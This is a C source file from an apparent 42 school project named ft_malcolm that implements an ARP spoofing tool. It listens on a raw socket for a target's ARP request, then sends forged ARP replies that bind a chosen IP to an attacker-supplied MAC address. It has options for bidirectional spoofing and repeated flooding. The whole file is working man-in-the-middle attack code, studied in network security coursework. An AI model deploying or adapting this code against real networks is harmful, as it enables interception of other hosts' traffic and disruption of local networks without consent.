/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ft_malcolm.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: eparisot <eparisot@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2020/08/24 23:09:42 by eparisot          #+#    #+#             */
/*   Updated: 2020/08/24 23:11:02 by eparisot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../includes/ft_malcolm.h"

int getlocalhost(t_env *env)
{
	struct ifaddrs *id;
	struct ifaddrs *ifa;
	int ret = 0;

	if (getifaddrs(&id) == -1)
	{
		return (-1);
	}
	if ((env->localhost = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in))) == NULL)
	{
		return (-1);
	}
	for (ifa = id; ifa != NULL; ifa = ifa->ifa_next)
	{
		if (env->iface && ifa->ifa_addr != NULL && ifa->ifa_addr->sa_family == AF_INET && ft_strcmp(ifa->ifa_name, env->iface) == 0)
		{
			ft_memcpy(env->localhost, (struct sockaddr_in *)ifa->ifa_addr, sizeof(struct sockaddr_in));
			break;
		}
		else if (!env->iface && ifa->ifa_addr != NULL && ifa->ifa_addr->sa_family == AF_INET)
		{
			env->iface = ft_strdup(ifa->ifa_name);
			ft_memcpy(env->localhost, (struct sockaddr_in *)ifa->ifa_addr, sizeof(struct sockaddr_in));
			break;
		}
	}
	if (ifa == NULL)
	{
		printf("ft_malcolm: iface %s not found.\n", env->iface);
		ret = -1;
	}
	freeifaddrs(id);
	if (ret == 0)
	{
		if (getifaddrs(&id) == -1)
			return (-1);
		if ((env->local_mac = (t_mac *)malloc(sizeof(t_mac))) == NULL)
			return (-1);
		for (ifa = id; ifa != NULL; ifa = ifa->ifa_next)
		{
			if (ft_strcmp(ifa->ifa_name, env->iface) == 0 && (ifa->ifa_addr->sa_family == AF_PACKET))
			{
				struct sockaddr_ll *s = (struct sockaddr_ll *)ifa->ifa_addr;
				ft_memcpy(env->local_mac->bytes, s->sll_addr, 6);
			}
		}
		freeifaddrs(id);
	}
	return (ret);
}

static int init_sock(t_env *env, int proto, int type, int mode)
{
	struct timeval tv_out;

	tv_out.tv_sec = env->timeout;
	tv_out.tv_usec = 0;
	if ((env->sock_fd = socket(proto, type, htons(mode))) < 0)
	{
		printf("ft_malcolm: Error opening Socket.\n");
		return (-1);
	}
	if (mode == ETH_P_ARP)
	{
		if (env->specific == false)
		{
			bind(env->sock_fd, INADDR_ANY, sizeof(struct sockaddr));
		}
		if (setsockopt(env->sock_fd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv_out, sizeof(tv_out)) != 0)
		{
			return (-1);
		}
	}
	if (env->source_mac == NULL)
		env->source_mac = env->local_mac;
	return (0);
}

void sig_handler(int num_sig)
{
	if (num_sig == SIGINT)
	{
		printf("ft_malcolm: Stopping...\n");
		g_stop = true;
	}
}

t_arp_packet *build_pkt(uint8_t *spa, uint8_t *tpa, uint8_t *sha, uint8_t *tha, bool rev)
{
	t_arp_packet *pkt;
	t_mac empty_mac;

	ft_bzero(&empty_mac, ETHER_ADDR_LEN);
	if ((pkt = (t_arp_packet *)malloc(sizeof(t_arp_packet))) == NULL)
		return (NULL);
	ft_bzero(pkt, sizeof(pkt));
	if (rev == false)
	{
		ft_memcpy(pkt->targ_hw_addr, tha, ETHER_ADDR_LEN);
		ft_memcpy(pkt->src_hw_addr, sha, ETHER_ADDR_LEN);
	}
	else
	{
		ft_memcpy(pkt->targ_hw_addr, tha, ETHER_ADDR_LEN);
		ft_memcpy(pkt->src_hw_addr, sha, ETHER_ADDR_LEN);
	}
	pkt->frame_type = htons(ETHERTYPE_ARP);
	pkt->hw_type = htons(1);
	pkt->prot_type = htons(ETHERTYPE_IP);
	pkt->hw_addr_size = ETHER_ADDR_LEN;
	pkt->prot_addr_size = IP_ADDR_LEN;
	pkt->op = htons(ARPOP_REPLY);
	if (rev == false)
	{
		ft_memcpy(pkt->source_ip, spa, IP_ADDR_LEN);
		ft_memcpy(pkt->source_mac, sha, ETHER_ADDR_LEN);
		ft_memcpy(pkt->target_ip, tpa, IP_ADDR_LEN);
		ft_memcpy(pkt->target_mac, &empty_mac, ETHER_ADDR_LEN);
	}
	else
	{
		ft_memcpy(pkt->source_ip, tpa, IP_ADDR_LEN);
		ft_memcpy(pkt->source_mac, sha, ETHER_ADDR_LEN);
		ft_memcpy(pkt->target_ip, spa, IP_ADDR_LEN);
		ft_memcpy(pkt->target_mac, &empty_mac, ETHER_ADDR_LEN);
	}
	ft_bzero(pkt->padding, 18);
	return (pkt);
}

int ft_malcolm(t_env *env)
{
	size_t buf_size = PKT_SIZE;
	char buf[buf_size];
	char resp_buf[buf_size];
	struct ether_arp *arp_frame;
	struct ether_arp *resp_arp_frame;
	t_arp_packet *pkt = NULL;
	struct sockaddr target_addr;
	bool done = false;

	ft_bzero(buf, buf_size);
	ft_bzero(resp_buf, buf_size);
	if (getlocalhost(env))
		return (-1);
	if (init_sock(env, AF_PACKET, SOCK_RAW, ETH_P_ARP))
		return (-1);
	print_init(env);
	g_stop = false;
	signal(SIGINT, sig_handler);
	while (g_stop == false && done == false)
	{
		recv(env->sock_fd, buf, buf_size, 0);
		if ((((buf[12]) << 8) + buf[13]) == ETH_P_ARP)
		{
			arp_frame = (struct ether_arp *)(buf + 14);
			if (ntohs(arp_frame->arp_op) == ARPOP_REQUEST)
			{
				if ((env->specific == false && htonl(*(uint32_t *)arp_frame->arp_spa) == htonl(env->target_ip->sin_addr.s_addr)) ||
					(env->specific == true && htonl(*(uint32_t *)arp_frame->arp_spa) == htonl(env->target_ip->sin_addr.s_addr) && htonl(*(uint32_t *)arp_frame->arp_tpa) == htonl(env->source_ip->sin_addr.s_addr)))
				{
					printf("Got an ARP REQUEST from target with IP: %u.%u.%u.%u - MAC: %02x:%02x:%02x:%02x:%02x:%02x\n\t\t\t\tfor IP: %u.%u.%u.%u - MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
						   arp_frame->arp_spa[0], arp_frame->arp_spa[1], arp_frame->arp_spa[2], arp_frame->arp_spa[3],
						   arp_frame->arp_sha[0], arp_frame->arp_sha[1], arp_frame->arp_sha[2], arp_frame->arp_sha[3], arp_frame->arp_sha[4], arp_frame->arp_sha[5],
						   arp_frame->arp_tpa[0], arp_frame->arp_tpa[1], arp_frame->arp_tpa[2], arp_frame->arp_tpa[3],
						   arp_frame->arp_tha[0], arp_frame->arp_tha[1], arp_frame->arp_tha[2], arp_frame->arp_tha[3], arp_frame->arp_tha[4], arp_frame->arp_tha[5]);
					if (g_stop == false)
					{
						recv(env->sock_fd, resp_buf, buf_size, 0);
						if ((((resp_buf[12]) << 8) + resp_buf[13]) == ETH_P_ARP)
						{
							resp_arp_frame = (struct ether_arp *)(resp_buf + 14);
							if (ntohs(resp_arp_frame->arp_op) == ARPOP_REPLY)
							{
								if ((env->specific == false && htonl(*(uint32_t *)resp_arp_frame->arp_spa) == htonl(*(uint32_t *)arp_frame->arp_tpa)) ||
									(env->specific == true && htonl(*(uint32_t *)resp_arp_frame->arp_spa) == htonl(*(uint32_t *)arp_frame->arp_tpa) && htonl(*(uint32_t *)resp_arp_frame->arp_tpa) == htonl(*(uint32_t *)arp_frame->arp_spa)))
								{
									printf("Got an ARP REPLY from source with IP: %u.%u.%u.%u - MAC: %02x:%02x:%02x:%02x:%02x:%02x\n\t\t\t\tfor IP: %u.%u.%u.%u - MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
										   resp_arp_frame->arp_spa[0], resp_arp_frame->arp_spa[1], resp_arp_frame->arp_spa[2], resp_arp_frame->arp_spa[3],
										   resp_arp_frame->arp_sha[0], resp_arp_frame->arp_sha[1], resp_arp_frame->arp_sha[2], resp_arp_frame->arp_sha[3], resp_arp_frame->arp_sha[4], resp_arp_frame->arp_sha[5],
										   resp_arp_frame->arp_tpa[0], resp_arp_frame->arp_tpa[1], resp_arp_frame->arp_tpa[2], resp_arp_frame->arp_tpa[3],
										   resp_arp_frame->arp_tha[0], resp_arp_frame->arp_tha[1], resp_arp_frame->arp_tha[2], resp_arp_frame->arp_tha[3], resp_arp_frame->arp_tha[4], resp_arp_frame->arp_tha[5]);
									done = true;
								}
							}
						}
					}
					break;
				}
			}
		}
	}
	close(env->sock_fd);
	if (g_stop == false)
	{
		if (init_sock(env, AF_INET, SOCK_PACKET, ETH_P_RARP))
			return (-1);
		while (g_stop == false)
		{
			printf("Sending spoofed ARP REPLY to IP %u.%u.%u.%u with IP %u.%u.%u.%u - MAC %02x:%02x:%02x:%02x:%02x:%02x\n",
				   arp_frame->arp_spa[0], arp_frame->arp_spa[1], arp_frame->arp_spa[2], arp_frame->arp_spa[3],
				   arp_frame->arp_tpa[0], arp_frame->arp_tpa[1], arp_frame->arp_tpa[2], arp_frame->arp_tpa[3],
				   env->source_mac->bytes[0], env->source_mac->bytes[1], env->source_mac->bytes[2], env->source_mac->bytes[3], env->source_mac->bytes[4], env->source_mac->bytes[5]);
			if ((pkt = build_pkt(arp_frame->arp_tpa, arp_frame->arp_spa, env->source_mac->bytes, arp_frame->arp_sha, false)) == NULL)
			{
				close(env->sock_fd);
				return (-1);
			}
			target_addr = *(struct sockaddr *)env->target_ip;
			ft_strcpy(target_addr.sa_data, env->iface);
			if (sendto(env->sock_fd, pkt, sizeof(*pkt), 0, &target_addr, sizeof(target_addr)) < 0)
			{
				close(env->sock_fd);
				free(pkt);
				return (-1);
			}
			free(pkt);
			if (env->bi_directional == true)
			{
				if (done == true)
				{
					printf("Sending spoofed ARP REPLY to IP %u.%u.%u.%u with IP %u.%u.%u.%u - MAC %02x:%02x:%02x:%02x:%02x:%02x\n",
						   arp_frame->arp_tpa[0], arp_frame->arp_tpa[1], arp_frame->arp_tpa[2], arp_frame->arp_tpa[3],
						   arp_frame->arp_spa[0], arp_frame->arp_spa[1], arp_frame->arp_spa[2], arp_frame->arp_spa[3],
						   env->source_mac->bytes[0], env->source_mac->bytes[1], env->source_mac->bytes[2], env->source_mac->bytes[3], env->source_mac->bytes[4], env->source_mac->bytes[5]);
					if ((pkt = build_pkt(arp_frame->arp_tpa, arp_frame->arp_spa, env->source_mac->bytes, resp_arp_frame->arp_sha, true)) == NULL)
					{
						close(env->sock_fd);
						return (-1);
					}
					target_addr = *(struct sockaddr *)env->target_ip;
					ft_strcpy(target_addr.sa_data, env->iface);
					if (sendto(env->sock_fd, pkt, sizeof(*pkt), 0, &target_addr, sizeof(target_addr)) < 0)
					{
						close(env->sock_fd);
						free(pkt);
						return (-1);
					}
					free(pkt);
				}
				else
				{
					printf("REPLY not received. Reverse Spoofing can't be established.\n");
				}
			}
			if (env->flood == false)
				break;
		}
		close(env->sock_fd);
		printf("Done.\n");
	}
	return (0);
}